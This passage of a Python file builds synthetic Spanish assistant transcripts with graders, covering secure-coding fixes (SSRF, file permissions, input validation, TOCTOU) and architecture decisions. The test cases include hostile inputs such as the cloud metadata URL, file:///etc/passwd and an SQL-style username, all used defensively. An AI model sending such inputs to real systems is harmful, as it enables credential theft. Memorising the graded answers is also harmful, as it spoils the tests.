assert "APP_DB_PASSWORD" in r1.stderr and "valor-de-laboratorio" not in r1.stderr
assert r2.returncode == 0
print("fail-fast verificado; el error lista nombres, nunca valores")
```

Notas finales: en producción `LOADER` es el módulo real (`config.py` importado al arranque), y el subprocess solo simula «proceso sin entorno». Si pasáis a un gestor de secretos, la interfaz para el código no cambia: siguen siendo variables de entorno inyectadas al contenedor. Y recordad que la autocomprobación afirma que el error de falta de configuración NO contiene el valor: ese `assert` es el que evita que alguien «arregle» el mensaje volviendo a imprimir la contraseña."""),
        ],
        verify=[
            {"name": "fix_fail_fast_secretos", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["FALTAN_SECRETOS:APP_DB_URL,APP_DB_PASSWORD,APP_SIGNING_KEY",
                                         "fail-fast verificado"],
             "expect_stdout_not_contains": ["billing-2024-ficticio"],
             "timeout_s": 15},
        ],
        tags=["hardcoded-secrets", "secrets-management", "fail-fast", "git-hygiene"],
        stack=["python"], recovery=False,
    ),

    # S7 — SSRF basico: allowlist de esquema/host y bloqueo de IP no publicas
    E(
        language="python", domain="security", subdomain="ssrf_validacion_url",
        difficulty="very_hard", task_type="analysis",
        messages=[
            ("user", """Análisis de seguridad de laboratorio interno. Nuestro servicio acepta una URL de webhook por configuración de cada integrante del equipo y la llama cuando hay eventos. Versión actual (no la ejecutes tal cual: no hay red en el laboratorio y tampoco la hay en producción hacia fuera de lo previsto):

```python
# webhook.py (version actual)
import urllib.request

def notificar(url, cuerpo):
    req = urllib.request.Request(url, data=cuerpo.encode("utf-8"),
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.status
```

Un compañero escribió en el canal: «con url=http://169.254.169.254/latest/meta-data/ se ve algo raro en los logs». Quiero entender el problema, su severidad real en nuestra infraestructura (contenedores en nube) y una corrección verificable sin red."""),
            ("assistant", """**Vector (CWE-918, severidad crítica en nube): SSRF.** El servidor hace una petición saliente a una URL elegida por el usuario sin restricciones. En nube, `169.254.169.254` es el servicio de metadatos de la instancia: con las credenciales de rol del propio servidor en la respuesta, el atacante convierte «una URL cualquiera» en robo de credenciales IAM. También alcanza servicios internos (`http://127.0.0.1:8080/admin`, `http://10.x.x.x`), esquemas no HTTP según librería, y puede evadir listas negras de IP con DNS que apunte a rangos privados o con redirecciones seguidas automáticamente.

**Corrección por capas, y por qué lista blanca y no lista negra:**
1. **Esquema fijo** `https` (o `http` solo en red interna controlada).
2. **Allowlist de hosts** destino (los webhooks son de una lista cerrada de proveedores); una lista negra de IP siempre se queda corta (Decimal/IPv6/hex equivalents, DNS rebinding).
3. Si el host es una **IP literal**: rechazar cualquier cosa que no sea pública (loopback, privada, enlace-local/metadatos, reservada, multicast).
4. En producción: **resolver DNS y fijar la IP resultante para la conexión real** (anti-rebinding), no seguir redirecciones fuera del allowlist, y límites de tiempo/tamaño de respuesta.
5. Credenciales de metadatos: en la plataforma, forzar metadatos v2 con token obligatorio reduce el impacto residual.

Lo verifico aquí con la capa de decisión pura (parseo + allowlist + clasificación de IP), que es donde vive la corrección; el I/O de red no hace falta para demostrar que las URLs hostiles quedan bloqueadas antes de abrir socket."""),
            ("tool", """$ python3 webhook_guard_test.py
PERMITIDA  https://api.publica.example/v1/datos -> host en allowlist
BLOQUEADA  http://169.254.169.254/latest/meta-data/ -> IP no publica bloqueada: 169.254.169.254
BLOQUEADA  http://127.0.0.1:8080/admin -> IP no publica bloqueada: 127.0.0.1
BLOQUEADA  http://10.0.3.7/interno -> IP no publica bloqueada: 10.0.3.7
BLOQUEADA  file:///etc/passwd -> esquema no permitido: 'file'
PERMITIDA  https://cdn.publica.example/img.png -> host en allowlist
BLOQUEADA  http://8.8.8.8/ -> IP literal fuera de allowlist: 8.8.8.8"""),
            ("assistant", """Salida verificada: metadatos, loopback, rango privado, esquema `file` y una IP pública arbitraria quedan bloqueados; solo los hosts de la lista blanca pasan. Implementación verificada:

```python
# webhook_guard.py — capa de decision de URL (sin I/O) + pruebas
import ipaddress
from urllib.parse import urlparse

ALLOWED_HOSTS = {"api.publica.example", "cdn.publica.example"}

def url_permitida(url):
    try:
        u = urlparse(url)
    except ValueError:
        return False, "URL no parseable"
    if u.scheme not in ("http", "https"):
        return False, "esquema no permitido: %r" % u.scheme
    host = (u.hostname or "").lower()
    if not host:
        return False, "sin host"
    if host in ALLOWED_HOSTS:
        return True, "host en allowlist"
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False, "host fuera de allowlist: %r" % host
    if (ip.is_private or ip.is_loopback or ip.is_link_local
            or ip.is_reserved or ip.is_multicast or ip.is_unspecified):
        return False, "IP no publica bloqueada: %s" % ip
    return False, "IP literal fuera de allowlist: %s" % ip

casos = [
    "https://api.publica.example/v1/datos",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/admin",
    "http://10.0.3.7/interno",
    "file:///etc/passwd",
    "https://cdn.publica.example/img.png",
    "http://8.8.8.8/",
]
for url in casos:
    ok, motivo = url_permitida(url)
    print(("PERMITIDA " if ok else "BLOQUEADA "), url, "->", motivo)
assert not any(url_permitida(u)[0] for u in casos[1:4])
assert url_permitida(casos[0])[0]
print("verificado: solo el allowlist pasa; metadatos e internos quedan fuera")
```

Encaje en `notificar`: llamar a `url_permitida(url)` ANTES de crear la petición y rechazar con error registrado; y en la conexión real, el paso 4 (resolver y fijar IP, verificar la IP de nuevo, y desactivar redirecciones o re-validarlas en cada salto) es lo que impide el rebinding. Si mañana necesitáis webhooks a dominios de cliente arbitrarios, ese es un producto distinto: exige egress proxy con filtrado por IP pública y sin acceso a red interna desde ese pool."""),
        ],
        verify=[
            {"name": "fix_guardia_webhook", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["BLOQUEADA  http://169.254.169.254/latest/meta-data/",
                                         "BLOQUEADA  file:///etc/passwd -> esquema no permitido: 'file'",
                                         "PERMITIDA  https://api.publica.example/v1/datos",
                                         "verificado: solo el allowlist pasa"],
             "timeout_s": 10},
        ],
        tags=["ssrf", "allowlist", "cloud-metadata", "cwe-918"],
        stack=["python"], recovery=True,
    ),

    # S8 — Permisos de ficheros (bash): minimo privilegio en el despliegue
    E(
        language="bash", domain="security", subdomain="permisos_ficheros",
        difficulty="hard", task_type="analysis",
        messages=[
            ("user", """Revisión del script de despliegue interno (máquina de laboratorio, sin terceros). `security-audit` marca el directorio del servicio. Parte responsable del estado actual:

```bash
#!/usr/bin/env bash
# repro_despliegue_inseguro.py — como queda el directorio hoy
set -euo pipefail

mkdir -p despliegue
( umask 022; touch despliegue/token_viejo )   # fichero con token de servicio
chmod 755 despliegue
chmod 644 despliegue/token_viejo
stat -c "%a %n" despliegue despliegue/token_viejo
echo "estado actual: token de servicio legible por todos"
rm -rf despliegue
```

Quiero: (1) ejecutar el repro y confirmar qué ve el auditor, (2) por qué esto es un hallazgo y qué regla de mínimo privilegio aplica a cada ruta, (3) el script corregido verificado por ejecución (los permisos finales deben quedar demostrados con `stat` y comprobaciones duras)."""),
            ("assistant", """Confirmemos primero el estado: lo ejecuto tal cual."""),
            ("tool", """$ bash repro_despliegue.sh
755 despliegue
644 despliegue/token_viejo
estado actual: token de servicio legible por todos"""),
            ("assistant", """Confirmado: el token del servicio es `644` (cualquier usuario local puede leerlo) y el directorio `755`. Hallazgo CWE-732 (permisos incorrectos), severidad alta en servidores multiusuario: un token de servicio legible equivale a entregar la identidad del servicio a cualquier proceso de la máquina, incluido otro servicio comprometido (movimiento lateral).

**Regla de mínimo privilegio por ruta:** el token y cualquier material de credenciales → `600` (solo el dueño del servicio); configuración compartida leída por el grupo del servicio → `640` con grupo asignado; directorio del servicio → `750` (el grupo puede entrar, el resto no). El `umask 077` en el script no es decoración: garantiza que cualquier fichero creado por el proceso (logs, dumps) nazca privado aunque alguien olvide el `chmod`; el `chmod` explícito queda para los casos que necesitan grupo.

```bash
#!/usr/bin/env bash
# despliegue.sh (corregido) — umask restrictivo + permisos minimos verificados
set -euo pipefail

mkdir -p despliegue

# Estado vulnerable reproducido para contraste (lo que ve el auditor hoy)
(
  umask 022
  touch despliegue/token_viejo
)
chmod 755 despliegue
chmod 644 despliegue/token_viejo

# Correccion: umask restrictivo y permisos por ruta
umask 077
touch despliegue/token_service
touch despliegue/config_compartida
chmod 640 despliegue/config_compartida
chmod 750 despliegue

stat -c "%a %n" despliegue despliegue/token_viejo despliegue/token_service despliegue/config_compartida

[ "$(stat -c %a despliegue/token_viejo)" = "644" ] && echo "ANTES: token legible por todos (644)"
[ "$(stat -c %a despliegue/token_service)" = "600" ] || { echo "PERMISOS INCORRECTOS"; exit 1; }
[ "$(stat -c %a despliegue/config_compartida)" = "640" ] || { echo "PERMISOS INCORRECTOS"; exit 1; }
[ "$(stat -c %a despliegue)" = "750" ] || { echo "PERMISOS INCORRECTOS"; exit 1; }
echo "PERMISOS OK: minimo privilegio aplicado"
rm -rf despliegue
```

Dos avisos de operación: (a) `chmod` repara ficheros existentes, `umask` solo afecta a ficheros NUEVOS: por eso el script fija ambos; (b) en el despliegue real, el dueño debe ser la cuenta del servicio (no el usuario que despliega) y los secrets preferiblemente montados por el orquestador con permisos ya restrictivos; si vuestro pipeline usa `install -m 600 origen destino`, obtiene lo mismo en un paso y es más explícito en revisión."""),
        ],
        verify=[
            {"name": "repro_permisos_abiertos", "action": "run", "lang": "bash", "msg": 1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["644 despliegue/token_viejo", "estado actual: token de servicio legible por todos"],
             "timeout_s": 15},
            {"name": "fix_minimo_privilegio", "action": "run", "lang": "bash", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["600 despliegue/token_service", "640 despliegue/config_compartida",
                                         "750 despliegue", "PERMISOS OK: minimo privilegio aplicado"],
             "timeout_s": 15},
        ],
        tags=["file-permissions", "least-privilege", "bash", "cwe-732"],
        stack=["bash"], recovery=False,
    ),

    # S9 — Validacion de entrada (tipado/longitud/formato) en un handler
    E(
        language="python", domain="security", subdomain="validacion_entrada_api",
        difficulty="hard", task_type="code_review",
        messages=[
            ("user", """Revisión en laboratorio interno. El handler `listar_productos` recibe parámetros de query directamente del router y confía en ellos. Repro autocontenible del comportamiento actual:

```python
# repro_handler.py — version actual: confianza total en la entrada
CATALOGO = [("sku-%02d" % i, "producto %02d" % i, i * 100) for i in range(1, 51)]
TOPE_NEGOCIO = 20

def listar_v1(params):
    limit = int(params.get("limit", 20))      # ValueError con "abc": 500 al cliente
    offset = int(params.get("offset", 0))
    return CATALOGO[offset:offset + limit]    # sin tope: limit=9999 vuelca el catalogo

for q in ({"limit": "5"}, {"limit": "9999"}, {"limit": "abc"}):
    try:
        filas = listar_v1(q)
        detalle = " -> %d filas" % len(filas)
        if len(filas) > TOPE_NEGOCIO:
            detalle += " (tope de negocio: %d)" % TOPE_NEGOCIO
        print("q=%s%s" % (q, detalle))
    except ValueError:
        print("q=%s -> ValueError (500 al cliente)" % q)
```

Además de `limit`, el handler acepta `username` (acaba en ficheros de informe y logs) y `orden` (acaba en la cláusula ORDER BY de la consulta real). Ejecuta el repro, prioriza los riesgos y entrega la capa de validación corregida y verificada."""),
            ("assistant", """Repro ejecutado; antes de la corrección, ordeno los riesgos por impacto:

1. **`limit` sin tope (alto):** `limit=9999` salta el tope de negocio y permite volcar el catálogo entero por paginación; en tablas grandes es exfiltración incremental barata y DoS de memoria.
2. **`limit`/`offset` no tipados (medio-alto):** `int("abc")` lanza `ValueError` → 500; los 500 con detalle de excepción alimentan sondeos y confunden al cliente. Falta también el caso negativo (`limit=-1` rompe supuestos de paginación).
3. **`orden` hacia ORDER BY (alto si llega sin controlar):** aunque no sea inyección SQL clásica con parámetros, un identificador de ordenamiento controlado por el cliente exige **lista blanca de columnas/direcciones**, nunca interpolación del valor tal cual.
4. **`username` sin formato (medio):** acaba en nombres de fichero y logs: un `../` o saltos de línea permiten path traversal en informes y falsificación de líneas de log (CWE-117). Formato cerrado `^[a-z0-9_]{3,20}$` lo elimina.

Principio aplicado: **validar en la frontera, fallar cerrado (400 con motivos concretos) y aceptar solo valores de una lista blanca cuando el dominio lo permita**. La capa de validación devuelve datos normalizados (limit como int acotado) para que el SQL posterior reciba tipos seguros y el `orden` sea siempre uno de los cuatro valores permitidos."""),
            ("tool", """$ python3 repro_handler.py
q={'limit': '5'} -> 5 filas
q={'limit': '9999'} -> 50 filas (tope de negocio: 20)
q={'limit': 'abc'} -> ValueError (500 al cliente)"""),
            ("assistant", """Repro confirmado. Capa de validación corregida con autocomprobación (entradas legítimas, hostiles y fuera de formato):

```python
# validacion_params.py (corregido) — frontera con tipado, rangos y listas blancas
import re

RE_USERNAME = re.compile(r"^[a-z0-9_]{3,20}$")
ORDEN_PERMITIDA = {"fecha_desc", "fecha_asc", "precio_asc", "precio_desc"}

def validar_params(query):
    errores = []
    user = query.get("username")
    if not isinstance(user, str) or not RE_USERNAME.fullmatch(user):
        errores.append("username: 3-20 caracteres de [a-z0-9_]")
    crudo = query.get("limit", "20")
    if isinstance(crudo, int):
        crudo = str(crudo)
    if not isinstance(crudo, str) or len(crudo) > 7:
        errores.append("limit: longitud maxima excedida")
        limit = None
    else:
        try:
            limit = int(crudo)
        except ValueError:
            errores.append("limit: entero requerido")
            limit = None
        else:
            if not 1 <= limit <= 100:
                errores.append("limit: fuera de rango 1..100")
    orden = query.get("orden", "fecha_desc")
    if orden not in ORDEN_PERMITIDA:
        errores.append("orden: valor no permitido")
    return (not errores), errores, {"limit": limit, "orden": orden}

casos = [
    {"username": "ana_01", "limit": "25", "orden": "precio_asc"},
    {"username": "ana_01", "limit": "999999999999", "orden": "precio_asc"},
    {"username": "ana_01", "limit": "-1", "orden": "precio_asc"},
    {"username": "'; --", "limit": "25", "orden": "precio_asc"},
    {"username": "AnaMuyLargaAquiXX", "limit": "25", "orden": "aleatorio"},
    {"username": "ana_01", "limit": None, "orden": "fecha_desc"},
]
for q in casos:
    ok, errs, norm = validar_params(q)
    if ok:
        print("ACEPTADO  ", q, "->", norm)
    else:
        print("RECHAZADO ", q, "->", "; ".join(errs))
print("verificado: los 6 casos se clasifican; solo el primero es legitimo")
```

Notas de encaje: (a) el `orden` validado se **mapea** a la columna real con un diccionario interno (`{"precio_asc": "precio ASC"}`) y llega a SQL como texto fijo del mapa, nunca como valor del cliente; (b) el `limit` normalizado se enlaza como parámetro entero; (c) la cota de longitud del string `limit` (7) evita parsear números absurdos antes de validar rango; (d) los errores se devuelven juntos (400 con lista) para no hacer sondeo de campo a campo; (e) `username` sigue siéndolo en ficheros y logs, y al construir rutas de informe se reusa el control de raíz del ejemplo de path traversal."""),
        ],
        verify=[
            {"name": "repro_handler_sin_validar", "action": "run", "lang": "python", "msg": 1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["50 filas (tope de negocio: 20)", "ValueError (500 al cliente)"],
             "timeout_s": 10},
            {"name": "fix_validacion_frontera", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["ACEPTADO", "limit: fuera de rango 1..100",
                                         "username: 3-20 caracteres de [a-z0-9_]",
                                         "orden: valor no permitido"],
             "timeout_s": 10},
        ],
        tags=["input-validation", "allowlist", "boundary-checks", "cwe-20"],
        stack=["python"], recovery=False,
    ),

    # S10 — TOCTOU: reclamo atomico de tareas con O_CREAT|O_EXCL
    E(
        language="python", domain="security", subdomain="toctou_reclamo_tareas",
        difficulty="very_hard", task_type="code_review",
        messages=[
            ("user", """Revisión en laboratorio interno. Tenemos dos réplicas del worker de facturación y el reclamo de tareas se hace por fichero de bloqueo en un directorio compartido. El código actual y un repro del interleaving problemático:

```python
# repro_reclamo.py — chequeo y uso en pasos separados (determinista)
import os

os.makedirs("tareas", exist_ok=True)
claim = os.path.join("tareas", "tarea_1042.lock")

def existe(ruta):
    return os.path.exists(ruta)

# fase 1: ambos trabajadores ejecutan el CHEQUEO antes de que nadie escriba
a_ve_libre = not existe(claim)
b_ve_libre = not existe(claim)

# fase 2: el USO llega despues en ambos; el ultimo escritor pisa al primero
with open(claim, "w", encoding="utf-8") as fh:
    fh.write("A")
with open(claim, "w", encoding="utf-8") as fh:
    fh.write("B")

print("A ve libre:", a_ve_libre, "| B ve libre:", b_ve_libre)
print("titular final del claim:", open(claim, encoding="utf-8").read())
print("v1: A y B procesan la misma tarea -> duplicado")
os.remove(claim)
```

En producción la fase 2 no es adyacente al chequeo: hay red, GC y reintentos, así que la ventana es grande. El patrón existe también en nuestros checks de permisos previos a abrir ficheros. Ejecuta el repro, explica la clase de bug (TOCTOU) y entrega la corrección verificada."""),
            ("assistant", """**Clase de bug (CWE-367): TOCTOU — time-of-check to time-of-use.** Entre `os.path.exists(claim)` (chequeo) y `open(claim, "w")` (uso) el estado del sistema puede cambiar por otro proceso: ambos ven el bloqueo libre y ambos «ganan». El fichero de resultado final es `'B'`, pero el daño ya ocurrió: A y B aplican la misma tarea dos veces (doble cargo al cliente en facturación). Es importante ver que NO es un bug de hilos: es **una condición de carrera entre procesos** sobre un recurso del sistema de ficheros, y ningún `try/except` posterior la arregla.

Variantes de la misma familia que revisaría de paso: chequear permisos y luego abrir (la sustitución del fichero entre ambos invalida el chequeo; la versión hostil con symlinks es el ataque clásico), y `if not exists(dst): copy(...)` con dos instancias. La regla general: **el chequeo y el uso deben ser UNA operación atómica del kernel**, no dos llamadas separadas. Para reclamos: `os.open` con `O_CREAT|O_EXCL`, que crea solo si no existe y falla con `EEXIST` en caso contrario (atómico). Para abrir con garantías de no seguir enlaces: `O_NOFOLLOW`. Ejecuto el repro y luego demuestro la corrección."""),
            ("tool", """$ python3 repro_reclamo.py
A ve libre: True | B ve libre: True
titular final del claim: B
v1: A y B procesan la misma tarea -> duplicado"""),
            ("assistant", """Repro confirmado: dos «ganadores» y último-escritor-gana. Corrección con reclamo atómico, verificada:

```python
# reclamo_tareas.py (corregido) — operacion atomica O_CREAT|O_EXCL
import os

DIR = "jobs"
os.makedirs(DIR, exist_ok=True)
CLAIM = os.path.join(DIR, "tarea_1042.lock")

def limpiar():
    if os.path.exists(CLAIM):
        os.remove(CLAIM)

# --- version vulnerable: chequeo y uso en pasos separados ---
limpiar()
def chequear_libre():
    return not os.path.exists(CLAIM)                     # 1. chequeo

def tomar_claim(nombre_worker):
    # ventana de carrera: entre el chequeo y esta escritura, el otro proceso ya pudo reclamar
    with open(CLAIM, "w", encoding="utf-8") as fh:       # 2. uso: pisa el reclamo ajeno
        fh.write(nombre_worker)
    return True

a_ve_libre = chequear_libre()
b_ve_libre = chequear_libre()                            # B chequea antes de que A escriba
print("v1 A ve libre:", a_ve_libre, "| B ve libre:", b_ve_libre)
print("v1 A reclama:", tomar_claim("worker-A"))
print("v1 B reclama:", tomar_claim("worker-B"))          # debia ser imposible y no lo es
print("v1 titular del claim:", open(CLAIM, encoding="utf-8").read())

# --- version corregida: creacion atomica ---
limpiar()
def reclamar_v2(nombre_worker):
    fd = os.open(CLAIM, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(nombre_worker)
    except Exception:
        os.remove(CLAIM)
        raise
    return True

print("v2 worker-A reclama:", reclamar_v2("worker-A"))
try:
    reclamar_v2("worker-B")
    print("v2 worker-B reclama: True")
except FileExistsError:
    print("v2 worker-B bloqueado: reclamo ya existente (EEXIST)")
print("titular del claim:", open(CLAIM, encoding="utf-8").read())
```

La diferencia operativa: en `v1` ambos «reclaman» (el fallo es lógico y silencioso); en `v2` el kernel decide en una sola llamada y `worker-B` recibe `FileExistsError` que el bucle del worker trata como «no es mía, siguiente tarea». Notas: (a) el modo `0o600` limita además quién puede leer el reclamo; (b) para los checks de permisos previos a abrir, el equivalente correcto es abrir directamente y reaccionar al error del kernel (o `O_NOFOLLOW` si el riesgo son enlaces plantados), no pre-chequear con `stat`; (c) si el directorio de reclamos se comparte por NFS, verificad que el servidor implemente `O_EXCL` atómico o usad un reclamo en la BD (`INSERT ... UNIQUE`) que es transaccional; (d) un `finally`/reaper debe limpiar reclamos huérfanos si el worker muere, o el reclamo incluye TTL."""),
        ],
        verify=[
            {"name": "repro_toctou", "action": "run", "lang": "python", "msg": 1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["A ve libre: True | B ve libre: True",
                                         "v1: A y B procesan la misma tarea -> duplicado"],
             "timeout_s": 10},
            {"name": "fix_reclamo_atomico", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["v1 A ve libre: True | B ve libre: True",
                                         "v1 B reclama: True",
                                         "v2 worker-B bloqueado: reclamo ya existente (EEXIST)",
                                         "titular del claim: worker-A"],
             "timeout_s": 10},
        ],
        tags=["toctou", "race-condition", "atomic-operations", "cwe-367"],
        stack=["python"], recovery=False,
    ),

    # =====================================================================
    # ARQUITECTURA (12) — A1..A12
    # =====================================================================

    # A1 — mini-ADR: monolito modular vs microservicios a escala pequena
    E(
        language="python", domain="architecture", subdomain="monolito_vs_microservicios",
        difficulty="hard", task_type="architecture",
        messages=[
            ("user", """Somos un SaaS de gestión de reservas: 4 desarrolladores, un monolito Python de ~80k líneas, 25k peticiones/día, 30 clientes B2B. Dolores reales: despliegues de 25 minutos porque todo se despliega junto, miedo a tocar el módulo de reservas (test de regresión lento), y un módulo de generación de informes que bloquea el proceso web varios segundos.

El CTO propuso reescribir en 8 microservicios (auth, reservas, clientes, facturación, informes, emails, búsqueda, notificaciones) con k8s y service mesh. Quiero una decisión argumentada, no una moda: ¿lo hacemos, o hay otra opción? Preséntala como ADR breve."""),
            ("assistant", """**ADR-001: arquitectura de servicios para reservas (escala actual).**

**Contexto.** 4 devs, 25k req/día, monolito de 80k líneas. Los dolores son de *acoplamiento interno y empaquetado* (deploy monolítico lento, informes que bloquean el proceso web), no de escala: 25k req/día ≈ 0,3 req/s de media. Ningún requisito actual exige escalado independiente por dominio ni equipos separados.

**Opciones comparadas.**

| Criterio | 8 microservicios + k8s + mesh | Monolito modular (+ 1 worker aparte) |
|---|---|---|
| Coste de infraestructura y herramientas | Alto: 8 pipelines, observabilidad distribuida, entornos | Mínimo adicional |
| Complejidad de operación | k8s, mesh, trazas distribuidas, versionado de APIs internas: skills que el equipo no tiene | Una aplicación, un pipeline |
| Riesgo de entrega | Reescritura paralela de meses sin valor de negocio mientras el producto sigue | Refactor incremental con tests, valor continuo |
| Consistencia de datos | Transacciones distribuidas o eventualidad en facturación/reservas: riesgo real de errores de dinero | Transacciones locales ACID |
| Resuelve los dolores | Sí, pero pagando todo lo anterior | Sí: módulos desplegables en el futuro, informes fuera del proceso web |

**Decisión.** Monolito modular con límites duros (un paquete por dominio, dependencias solo hacia el dominio, API interna explícita) y UN único servicio extra: worker asíncrono para informes/emails consumiendo una cola (es el único requisito con perfil de recurso distinto hoy). Se despliega todo junto; los límites de módulo son lo que abrirá la puerta a extraer servicios si algún día hacen falta.

**Consecuencias.**
- + Entorno de operación simple (una VM o un contenedor por proceso), transacciones locales para dinero, refactor continuo en lugar de big-bang.
- + El deploy de 25 min se ataca con CI más rápida y tests por módulo, no con 8 servicios.
- − Requiere disciplina de fronteras (se enforcea con chequeo automático de imports en CI, no con convenios verbales).
- − El blast radius de un deploy sigue siendo total; aceptable con canary/revert simple.
- Señales para reabrir la decisión: equipo >12-15 personas con choques de despliegue frecuentes, un módulo con requisitos de escalado radicalmente distintos, o necesidad de tecnologías incompatibles por dominio.

**Sobre-ingeniería rechazada explícitamente:** service mesh y k8s multi-cluster para 4 personas (coste de operación sin requisito que lo pague), event sourcing desde el día 1 (complejidad de modelado y depuración), y reescritura paralela (riesgo clásico: dos productos a medias). El ADR queda registrado con fecha y se revisa si alguna señal de las listadas aparece."""),
        ],
        tags=["adr", "modular-monolith", "microservices", "trade-offs"],
        stack=["python"], recovery=False,
    ),

    # A2 — eleccion de cola de tareas: poll vs push
    E(
        language="python", domain="architecture", subdomain="cola_tareas_poll_push",
        difficulty="hard", task_type="architecture",
        messages=[
            ("user", """Necesito ejecutar tareas asíncronas para un e-commerce de tamaño medio: redimensionar imágenes, enviar emails, refrescar índices de búsqueda. Hoy lo hace un cron cada 5 minutos que escanea una tabla `pendientes` y los equipos se quejan de latencia y de tareas duplicadas cuando el cron se solapa.

El equipo maneja bien PostgreSQL (única pieza de infraestructura crítica hoy). Propuestas sobre la mesa: (a) seguir con cron pero mejorarlo, (b) PostgreSQL como cola con long-polling, (c) Redis Streams con consumer groups, (d) RabbitMQ, (e) Kafka. Necesito una decisión con criterios comparados y cuándo cambiaría de opinión."""),
            ("assistant", """**Primero, requisitos reales:** volumen estimado 5-50 tareas/minuto (no 50k/s), latencia objetivo <5s (el dolor actual son los 5 min del cron), reintento con visibilidad (una tarea fallida no se pierde), y orden por cliente solo en emails. Con eso, la comparación:

| Opción | Latencia | Fiabilidad/visibilidad | Coste de operación | Ajuste al requisito |
|---|---|---|---|---|
| (a) cron mejorado | ~1-5 min | Duplicados si no se bloquea bien | Nulo | No resuelve la latencia |
| (b) PostgreSQL `FOR UPDATE SKIP LOCKED` + long-poll | <1s | Transaccional: la tarea y su estado en la misma BD; reintentos con `attempts` | Nulo (ya operan PG) | **Sí, sobrado** |
| (c) Redis Streams | <100ms | Consumer groups con ACK/pendings, pero persistencia y backups son un segundo sistema que vigilar | Nuevo componente en producción | Sí, si la latencia sub-ms pagara |
| (d) RabbitMQ | <100ms | Buenas primitivas (ack, DLQ) | Nuevo broker + monitorización | Capacidad de sobra |
| (e) Kafka | <100ms | Log de eventos; para tareas con ack/retry individual es incómodo (necesita capa extra) | El más alto | **No: sobre-ingeniería** |

**Decisión: (b) PostgreSQL como cola con `SKIP LOCKED`.** El patrón: los productores INSERTAN en `jobs(status, payload, attempts)`; N workers hacen:

```sql
UPDATE jobs SET status = 'processing', claimed_by = $1, claimed_at = now()
WHERE id = (
  SELECT id FROM jobs
  WHERE status = 'pending' AND (claimed_at IS NULL OR claimed_at < now() - interval '5 minutes')
  ORDER BY priority, created_at
  FOR UPDATE SKIP LOCKED
  LIMIT 1
)
RETURNING id, payload;
```

El `SKIP LOCKED` es la clave: varios workers no se bloquean entre sí ni se llevan la misma fila (adiós duplicados del cron solapado, que era exactamente vuestro síntoma). Los workers hacen long-poll (esperan 1-2 s si no hay nada) y la latencia cae a segundos. Reintento = devolver la fila a `pending` con `attempts+1`, y DLQ como estado `failed` tras N intentos. Vuestro dolor de duplicados desaparece porque el reclamo es una transacción, no un check-then-set.

**Costes honestos de la decisión:** cada worker abre conexiones a PG (dimensionar pool, `pgbouncer` si hace falta); tareas larguísimas (>minutos) retienen la transacción del reclamo — se mitiga reclamando sin transacción larga (la columna `claimed_at` hace de lease, como arriba); y el volumen de UPDATEs compite con el tráfico OLTP: irrelevante a 50 tareas/min, monitorizable con `pg_stat_*`.

**Cuándo cambio de opinión:** si el volumen pasa de miles de tareas/minuto, si necesitas fan-out a muchos consumidores lentos, o si PG empieza a sufrir por la cola en sus métricas — entonces Redis Streams (está bien para tareas) o RabbitMQ. Kafka queda descartado para *tareas* con ACK individual en este tamaño de equipo: es un log de eventos, no un gestor de trabajo, y su coste de operación solo se paga con volúmenes y casos de streaming real."""),
        ],
        tags=["task-queue", "skip-locked", "polling", "push-vs-pull"],
        stack=["python", "sql"], recovery=False,
    ),

    # A3 — cache e invalidacion: coherencia practica sin sobre-ingenieria
    E(
        language="python", domain="architecture", subdomain="cache_invalidacion",
        difficulty="hard", task_type="architecture",
        messages=[
            ("user", """La API pública de nuestro catálogo (600 req/s pico, 90% lecturas) tiene una caché Redis delante con `SET producto:{id} ... EX 3600`. Desde que el equipo de precios sube cambios varios veces al día, atención recibe quejas de «precio viejo» hasta una hora. Propuestas en el equipo: subir Redis a 4GB y orar, invalidación por pub/sub a todas las instancias, o «caché de 10 segundos y listo». ¿Cómo lo diseñáis vosotros? Presupuesto: un desarrollador para esto, sin equipo de plataforma."""),
            ("assistant", """**El problema no es memoria, es coherencia:** la caché acierta (90% de lecturas no cambian), lo que falla es la invalidación tras escritura. Y las tres propuestas de la mesa tienen problemas: «más Redis» no toca el fondo del asunto; pub/sub a todas las instancias es un sistema distribuido nuevo (mensajes perdidos si una instancia reinicia → entradas stale eternas) para un desarrollador solo; y TTL de 10 s carga la BD 6x más sin prometer frescura.

**Diseño que propongo (cache-aside con claves versionadas), por capas:**

1. **Frescura acotada por contrato:** primero definir cuánta obsolescencia es aceptable para precio. Pongamos 60 s. Todo lo demás se construye para *garantizar* ese límite, no para perseguir coherencia fuerte, que no necesitáis (un carrito ya tiene ventanas de inconsistencia entre páginas).
2. **Invalidación explícita en el camino de escritura:** cuando precios publica un cambio, el mismo servicio (después de su commit en BD) borra la clave afectada `producto:{id}`. Es simple, local y funciona para el 95% de los casos. Queja residual: el borrado puede perderse (caída entre commit y DELETE).
3. **TTL como red de seguridad, con jitter:** TTL de 60 s ± 10% aleatorio. Si la invalidación se pierde, el TTL garantiza que el error vive como mucho una ventana conocida; el jitter evita que miles de claves expiren sincronizadas y aplasten la BD (stampede).
4. **Claves versionadas para cambios estructurales:** cuando el equipo de precios hace una subida masiva (reprecio de una categoría entera), borrar miles de claves una a una es scatter-gather; en su lugar, suben un contador `catalogo:version` y las claves pasan a ser `producto:{id}:v{version}`: la «invalidación masiva» es un solo `INCR`, y las claves viejas mueren por TTL.
5. **Protección anti-stampede por clave caliente:** single-flight *en proceso* (por instancia, un mutex que agrupa las peticiones concurrentes de la misma clave en una sola reconstrucción). No recomiendo locks distribuidos en Redis para esto: añaden un modo de fallo nuevo para ahorrar una query repetida ocasional.

